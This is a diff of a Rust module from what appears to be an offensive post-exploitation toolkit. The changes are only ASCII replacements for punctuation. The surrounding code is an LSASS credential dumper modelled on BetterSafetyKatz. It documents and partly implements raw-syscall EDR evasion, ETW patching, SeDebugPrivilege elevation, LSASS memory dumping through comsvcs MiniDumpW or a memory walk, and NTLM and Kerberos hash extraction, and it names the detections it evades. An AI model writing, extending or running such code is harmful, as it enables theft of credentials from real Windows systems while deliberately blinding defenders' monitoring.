@@ -1,4 +1,4 @@
-//! LSASS Credential Extraction — BetterSafetyKatz-style evasion
+//! LSASS Credential Extraction -- BetterSafetyKatz-style evasion
 //!
 //! Implements direct LSASS memory dumping and credential extraction using
 //! ONLY raw syscalls (via `crate::postex::syscall`), bypassing all userland
@@ -7,10 +7,10 @@
 //! # Evasion Techniques
 //!
 //! 1. **Raw syscalls**: Every NT API call uses `syscall` instruction via
-//!    `core::arch::asm!` — zero ntdll exports called, zero hooks hit.
+//!    `core::arch::asm!` -- zero ntdll exports called, zero hooks hit.
 //! 2. **No rundll32.exe**: comsvcs.dll's MiniDumpW is loaded and called
-//!    directly within our process — no child process, no process creation events.
-//! 3. **Memory-only**: Dumps go through memory — no files touched during
+//!    directly within our process -- no child process, no process creation events.
+//! 3. **Memory-only**: Dumps go through memory -- no files touched during
 //!    extraction (optional file output for offline parsing).
 //! 4. **ETW suppressed**: `EtwEventWrite` patched before credential access.
 //! 5. **SeDebugPrivilege via syscall**: No `Advapi32!AdjustTokenPrivileges` call.
@@ -18,11 +18,11 @@
 //!
 //! # Architecture
 //!
-//! 1. `enable_debug_privilege()` – SeDebugPrivilege via raw NtAdjustPrivilegesToken
-//! 2. `find_lsass_pid()`     – LSASS PID via raw NtQuerySystemInformation
-//! 3. `dump_lsass_via_minidump()` – comsvcs.dll MiniDumpW (in-process)
-//! 4. `dump_lsass_direct()`  – NtReadVirtualMemory page walk (fallback)
-//! 5. `parse_creds_from_dump()` – Extract NTLM/Kerberos from dumped memory
+//! 1. `enable_debug_privilege()` -- SeDebugPrivilege via raw NtAdjustPrivilegesToken
+//! 2. `find_lsass_pid()`     -- LSASS PID via raw NtQuerySystemInformation
+//! 3. `dump_lsass_via_minidump()` -- comsvcs.dll MiniDumpW (in-process)
+//! 4. `dump_lsass_direct()`  -- NtReadVirtualMemory page walk (fallback)
+//! 5. `parse_creds_from_dump()` -- Extract NTLM/Kerberos from dumped memory
 
 #![allow(dead_code)]
 
@@ -35,7 +35,7 @@ use std::collections::HashMap;
 #[cfg(target_os = "windows")]
 use tracing::{debug, info, warn};
 
-// ─── Constants ────────────────────────────────────────────────────
+// --- Constants ----------------------------------------------------
 
 /// NTSTATUS codes
 const STATUS_SUCCESS: i64 = 0;
@@ -80,7 +80,7 @@ const PAGE_NOCACHE: u32 = 0x200;
 #[allow(dead_code)]
 const PAGE_WRITECOMBINE: u32 = 0x400;
 
-// ─── Data Structures ──────────────────────────────────────────────
+// --- Data Structures ----------------------------------------------
 
 /// Credential extraction result from LSASS dump.
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -91,7 +91,7 @@ pub struct CredDumpResult {
     pub aes256_count: usize,
     /// Number of AES128 keys extracted  
     pub aes128_count: usize,
-    /// Extracted credentials (user→hash mapping)
+    /// Extracted credentials (user->hash mapping)
     pub credentials: Vec<ExtractedCredential>,
     /// Dump method used
     pub method: DumpMethod,
@@ -170,7 +170,7 @@ impl Default for CredDumpConfig {
     }
 }
 
-// ─── Main Entry Point ────────────────────────────────────────────
+// --- Main Entry Point --------------------------------------------
 
 /// Attempt to dump and extract credentials from LSASS using the most
 /// evasive method available.
@@ -317,7 +317,7 @@ pub unsafe fn extract_lsass_creds(_config: &CredDumpConfig) -> Result<CredDumpRe
     ))
 }
 
-// ─── SeDebugPrivilege ─────────────────────────────────────────────
+// --- SeDebugPrivilege ---------------------------------------------
 
 /// Enable SeDebugPrivilege in the current process token using raw syscalls.
 ///
@@ -389,7 +389,7 @@ unsafe fn enable_debug_privilege(_numbers: &SyscallNumbers) -> Result<()> {
     ))
 }
 
-// ─── LSASS PID Resolution ────────────────────────────────────────
+// --- LSASS PID Resolution ----------------------------------------
 
 /// Find the LSASS process ID via raw NtQuerySystemInformation.
 ///
@@ -445,7 +445,7 @@ unsafe fn find_lsass_pid(numbers: &SyscallNumbers) -> Result<u32> {
         //   Reserved (8 bytes)
         //   ImageName (8 bytes: UNICODE_STRING = {Length, MaxLength, Buffer})
         //   BasePriority (4 bytes)
-        //   UniqueProcessId (4 bytes on x86, 8 bytes on x64) ← THE PID
+        //   UniqueProcessId (4 bytes on x86, 8 bytes on x64) <- THE PID
         //   ...
         let ptr = buffer.as_ptr();
         let total_len = returned as usize;
@@ -459,7 +459,7 @@ unsafe fn find_lsass_pid(numbers: &SyscallNumbers) -> Result<u32> {
             // Read NextEntryOffset (u32 at offset 0)
             let next_offset = *(ptr.add(offset) as *const u32) as usize;
 
-            // Read UniqueProcessId — it's at offset 0x20 (32) on x64
+            // Read UniqueProcessId -- it's at offset 0x20 (32) on x64
             // Actually, let me be more careful. The struct layout on x64:
             // offset 0: NextEntryOffset (4 bytes)
             // offset 4: NumberOfThreads (4 bytes)
@@ -525,7 +525,7 @@ unsafe fn find_lsass_pid(_numbers: &SyscallNumbers) -> Result<u32> {
     ))
 }
 
-// ─── MiniDumpW (in-process comsvcs.dll) ─────────────────────────
+// --- MiniDumpW (in-process comsvcs.dll) -------------------------
 
 /// Dump LSASS memory using comsvcs.dll MiniDumpW loaded directly in-process.
 ///
@@ -534,12 +534,12 @@ unsafe fn find_lsass_pid(_numbers: &SyscallNumbers) -> Result<u32> {
 /// 1. Loads comsvcs.dll into OUR process via LoadLibrary
 /// 2. Gets the MiniDumpW export address
 /// 3. Builds the proper call with MiniDumpWithFullMemory (0x00000002)
-/// 4. Calls it directly — no child process, no rundll32.exe
+/// 4. Calls it directly -- no child process, no rundll32.exe
 ///
 /// This technique avoids:
 /// - Process creation alerts (rundll32.exe lsass.dmp is a known IOC)
 /// - Command-line logging (Event ID 4688: no suspicious command lines)
-/// - EDR process tree analysis (no lsass.exe → rundll32.exe parent)
+/// - EDR process tree analysis (no lsass.exe -> rundll32.exe parent)
 #[cfg(target_os = "windows")]
 unsafe fn dump_lsass_via_minidump(pid: u32, numbers: &SyscallNumbers) -> Result<Vec<u8>> {
     unsafe {
@@ -711,7 +711,7 @@ unsafe fn dump_lsass_via_minidump(_pid: u32, _numbers: &SyscallNumbers) -> Resul
     ))
 }
 
-// ─── Direct NtReadVirtualMemory ──────────────────────────────────
+// --- Direct NtReadVirtualMemory ----------------------------------
 
 /// Dump LSASS memory by walking memory regions with NtQueryVirtualMemory
 /// and reading each readable region with NtReadVirtualMemory.
@@ -780,7 +780,7 @@ unsafe fn dump_lsass_direct(pid: u32, max_mb: usize, numbers: &SyscallNumbers) -
             if qvm_status.ntstatus() == STATUS_ACCESS_DENIED
                 || qvm_status.ntstatus() == 0xC0000005i64
             {
-                // STATUS_ACCESS_DENIED or STATUS_INVALID_PARAMETER — past valid memory
+                // STATUS_ACCESS_DENIED or STATUS_INVALID_PARAMETER -- past valid memory
                 break;
             }
 
@@ -888,7 +888,7 @@ unsafe fn dump_lsass_direct(
     ))
 }
 
-// ─── Credential Parsing ──────────────────────────────────────────
+// --- Credential Parsing ------------------------------------------
 
 /// Parse a raw LSASS memory dump for NTLM hashes and Kerberos keys.
 ///
@@ -913,7 +913,7 @@ fn parse_creds_from_dump(dump: &[u8]) -> (usize, usize, usize, Vec<ExtractedCred
     // - Kerberos key structures with known magic bytes
 
     // Scan for 32-char hex strings that look like NTLM hashes
-    // Simple byte-level scan — look for consecutive hex chars without regex
+    // Simple byte-level scan -- look for consecutive hex chars without regex
     let bytes = dump_str.as_bytes();
     let mut i = 0;
     while i + 32 <= bytes.len() {
@@ -1019,7 +1019,7 @@ fn extract_username_before_hash(dump: &[u8], _hash: &str, hash_pos: Option<usize
     "unknown".to_string()
 }
 
-// ─── Tests ────────────────────────────────────────────────────────
+// --- Tests --------------------------------------------------------
 
 #[cfg(test)]
 mod tests {
